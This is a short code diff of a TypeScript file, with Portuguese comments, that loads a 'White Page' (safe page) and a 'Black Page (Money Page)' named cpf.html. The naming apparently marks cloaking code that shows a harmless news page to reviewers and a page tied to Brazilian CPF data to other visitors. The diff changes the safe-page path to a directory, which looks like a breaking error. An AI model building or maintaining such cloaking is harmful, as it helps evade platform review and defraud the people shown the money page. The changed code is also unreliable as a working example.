@@ -4,7 +4,7 @@ import { readFileSync } from 'fs';
 import { resolve } from 'path';
 
 // Caminhos para as páginas White e Black (Money Page)
-const WHITE_PAGE_PATH = resolve(process.cwd(), 'noticia/index.html'); // Safe Page
+const WHITE_PAGE_PATH = resolve(process.cwd(), 'noticia'); // Safe Page
 const BLACK_PAGE_PATH = resolve(process.cwd(), 'cpf.html'); // Money Page
 
 // Tenta ler o conteúdo das páginas uma vez
@@ -14,7 +14,7 @@ let blackPageContent: string | null = null;
 try {
   whitePageContent = readFileSync(WHITE_PAGE_PATH, 'utf-8');
 } catch (error) {
-  console.error("Erro ao ler White Page (noticia/index.html):", error);
+  console.error("Erro ao ler White Page (noticia):", error);
 }
 
 try {
